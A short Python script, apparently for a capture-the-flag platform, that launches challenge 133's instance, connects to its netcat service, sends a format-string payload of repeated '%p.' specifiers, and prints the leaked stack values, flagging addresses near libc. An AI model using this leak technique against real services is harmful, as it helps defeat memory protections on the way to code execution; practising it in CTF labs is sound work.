import sys, re, time, socket, json
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

cy = CyLab(delay=0.5)
cy.login()
st, b = cy.req("GET", "/api/challenges/133/instance/")
d = json.loads(b)
m = re.search(r"nc\s+(-v\s+)?([A-Za-z0-9.\-]+)\s+(\d{2,5})", d.get("description") or "")
if not m:
    cy.req("PUT", "/api/challenges/133/instance/?source=library")
    for _ in range(8):
        st, b = cy.req("GET", "/api/challenges/133/instance/")
        d = json.loads(b) if b.startswith("{") else {}
        m = re.search(r"nc\s+(-v\s+)?([A-Za-z0-9.\-]+)\s+(\d{2,5})", d.get("description") or "")
        if m:
            break
        time.sleep(0.4)
if not m:
    print("pas de service")
    sys.exit(1)
host, port = m.group(2), int(m.group(3))
print("cible:", host, port)
s = socket.create_connection((host, port), timeout=12)
s.settimeout(5)
s.sendall(("%p." * 60).encode() + b"\n")
out = b""
t0 = time.time()
while out.count(b"0x") < 40 and time.time() - t0 < 5:
    try:
        c = s.recv(8192)
        if not c:
            break
        out += c
    except socket.timeout:
        break
s.close()
vals = [int(v, 16) for v in re.findall(rb"0x[0-9a-f]+", out)]
print("valeurs:", len(vals))
for i, v in enumerate(vals):
    tag = ""
    if 0x7f0000000000 <= v <= 0x7fffffffffff:
        tag = "PROCHE-LIBC"
    print("  %2d: 0x%-14x mod4k=0x%03x %s" % (i, v, v % 0x1000, tag))
